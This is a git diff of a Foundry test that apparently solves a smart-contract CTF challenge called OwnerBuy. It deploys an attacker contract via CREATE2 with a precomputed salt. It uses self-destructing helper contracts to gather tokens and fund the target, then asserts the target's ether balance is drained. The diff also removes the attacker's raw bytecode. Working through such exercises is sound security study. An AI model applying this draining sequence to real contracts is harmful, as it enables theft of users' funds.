@@ -2,38 +2,41 @@
 pragma solidity 0.8.13;
 
 import "forge-std/Test.sol";
-import "../../src/04.challenge/OwnerBuy.sol";
-import "./attacker.sol";
+import "./bytecode.sol";
 
 contract attackTest is Test{
-    OwnerBuy ownerbuy;
-    // cast keccak 'bytecode'
-    bytes32 bytecodeHash = 0x1b6c104d26bd22b3ed558508806f09609ad333645e30b7de17d6671999c88c0d;
+    IOwnerBuy public ownerbuy;
     // 用remix获取attacker.sol的bytecode
-    bytes bytecode = hex"608060405234801561001057600080fd5b506040516103d33803806103d3833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6102bc806101176000396000f3fe60806040526004361061001e5760003560e01c8063db288a4c14610023575b600080fd5b61002b61002d565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff1660e01b815260040160206040518083038185885af115801561009b573d6000803e3d6000fd5b50505050506040513d601f19601f820116820180604052508101906100c091906101a0565b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb3060646040518363ffffffff1660e01b815260040161011d92919061025d565b6020604051808303816000875af115801561013c573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061016091906101a0565b50565b600080fd5b60008115159050919050565b61017d81610168565b811461018857600080fd5b50565b60008151905061019a81610174565b92915050565b6000602082840312156101b6576101b5610163565b5b60006101c48482850161018b565b91505092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101f8826101cd565b9050919050565b610208816101ed565b82525050565b6000819050919050565b6000819050919050565b6000819050919050565b600061024761024261023d8461020e565b610222565b610218565b9050919050565b6102578161022c565b82525050565b600060408201905061027260008301856101ff565b61027f602083018461024e565b939250505056fea2646970667358221220ece713afc3806bd56b62f76f9c55282bb3455a78c5a3c9995759d3867eb8d94564736f6c634300080d0033";
+    bytes bytecode = BYTECODE;
+    bytes32 bytecodeHash = 0x3441600f3121d3cc8960a9230b29772dc5ad4318ec5a1768296869a7c6821001;
 
-    function setUp() public{
-        ownerbuy = new OwnerBuy();
-    }
+    function setUp() public{}
 
     function test_isComplete() public {
         // 用户0x5B38Da6a701c568545dCfcB03FcB875f56beddC4来进行攻击
+        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4).transfer(1 ether); // 给点钱，否则无法buy()
         vm.startPrank(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);
+        vm.label(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4), "user"); 
 
-        // 部署攻击合约
-        attacker attackerAddress = attacker(payable(deploy(0x000000000000000000000000000000000000000000000000000000000000a83c)));
+        // 部署攻击合约,注意要用solidity来计算！不要直接用网页上面的keccak256，因为要做一点abi格式化
+        // 需要用到脚本来计算salt，就不放在GitHub了，博客中关于CREATE2的内容中有可以自行找一下
+        IAttacker attackerAddress = IAttacker(payable(deploy(0x0000000000000000000000000000000000000000000000000000000000025884)));
+        vm.label(address(attackerAddress), "attackerAddress");
+
         // 攻击之前初始化
-        attackerAddress.init(address(ownerbuy));
-        attackerAddress.beforeAttack();
+        attackerAddress.init();
+        ownerbuy = IOwnerBuy(address(attackerAddress.ownerbuy()));
+        vm.label(address(ownerbuy), "ownerbuy");
+        attackerAddress.beforeAttack{value:1 wei}();
+
         // 使用三个Helper来获得空投满足条件
-        for(uint8 i = 0; i < 3; i++){
+        for(uint256 i = 0; i < 4; i++){
             Helper helper = new Helper(address(ownerbuy));
-            helper.buyAndTransfer{value:1 wei}();
+            helper.buyAndTransfer{value:10000 wei}(address(attackerAddress));
         }
-        // 开始攻击
-        attackerAddress.Attack();
-        // 检查是否攻击成功
-        assertEq(attackerAddress.finish(), true);
+
+        attackerAddress.Attack(); // 开始攻击
+        assertEq(address(ownerbuy).balance, 0); // 检查是否攻击成功
 
         vm.stopPrank();
     }
@@ -47,4 +50,39 @@ contract attackTest is Test{
         return addr;
     }
 
+}
+
+contract Helper{
+    IOwnerBuy ownerbuy;
+    
+    constructor(address _addr) payable public{
+        ownerbuy = IOwnerBuy(_addr);
+    }
+    function buyAndTransfer(address _addr) public payable {
+        ownerbuy.buy{value: 1 wei}(); // 获得100元
+        ownerbuy.transfer(_addr,100); // 转给攻击合约地址
+        selfdestruct(payable(address(ownerbuy))); // sell()的时候ownerbuy需要钱才能调用
+    }
+
+}
+
+interface IOwnerBuy{
+    function buy() external payable returns (bool);
+    function sell(uint256) external returns (bool );
+    function finish() external  returns (bool);
+    function changeOwner() external;
+    function changestatus(address) external;
+    function transferOwnership(address) external;
+    function transfer(address, uint256) external returns (bool);
+    function _owner() external returns(address);
+    function balanceOf(address ) external view returns (uint256);
+    
+}
+
+interface IAttacker{
+    function ownerbuy() external view returns(address);
+    function init() external;
+    function beforeAttack() external payable;
+    function Attack() external;
+    function isOwner(address ) external returns(bool);
 }
